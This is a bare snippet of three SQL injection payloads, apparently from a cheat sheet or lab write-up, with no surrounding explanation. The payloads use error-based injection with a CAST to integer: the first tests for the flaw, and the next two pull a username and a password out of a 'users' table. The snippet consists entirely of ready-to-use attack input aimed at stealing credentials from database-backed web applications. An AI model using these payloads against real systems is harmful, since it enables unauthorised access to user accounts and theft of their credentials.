____

```sql
' AND 1=CAST((SELECT 1) AS int)--
```

```sql
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```
